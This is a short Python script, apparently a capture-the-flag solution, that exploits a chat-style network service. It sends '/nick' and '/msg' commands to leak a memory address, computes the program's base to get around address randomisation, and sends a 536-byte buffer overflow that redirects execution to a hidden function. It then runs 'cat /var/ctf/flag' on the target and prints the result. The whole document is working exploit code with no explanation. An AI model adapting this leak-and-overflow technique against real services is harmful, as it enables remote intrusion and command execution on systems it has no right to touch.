#!/usr/bin/env python

from socket import *
from struct import unpack, pack
from time import sleep
import sys

HOST = sys.argv[1]
PORT = int(sys.argv[2])
BUFSIZE = 4096
ADDR = (HOST, PORT)

s = socket(AF_INET, SOCK_STREAM)
try:
	s.connect(ADDR)
except Exception as e:
	print('Cannot connect to the server.')
	sys.exit()

sleep(1)
s.recv(BUFSIZE)
sleep(1)
s.send("/nick 123\n")
s.recv(BUFSIZE)
sleep(1)
s.send("/msg 123 hi\n")
leak = s.recv(BUFSIZE) 

text_space = leak[0x440:0x440+0x8]
text_space = (unpack('<Q', text_space)[0] & 0xfffffffffffff000) - 0x3000
hint_offset = 0x2551
hint = text_space + hint_offset 

payload = ""
payload += "A"*536
payload += pack('<Q', hint)

sleep(1)
s.send(payload + '\n') 
sleep(1)
s.send("cat /var/ctf/flag\n")
flag = s.recv(BUFSIZE)
flag = flag.rstrip()
sys.stdout.write(flag)
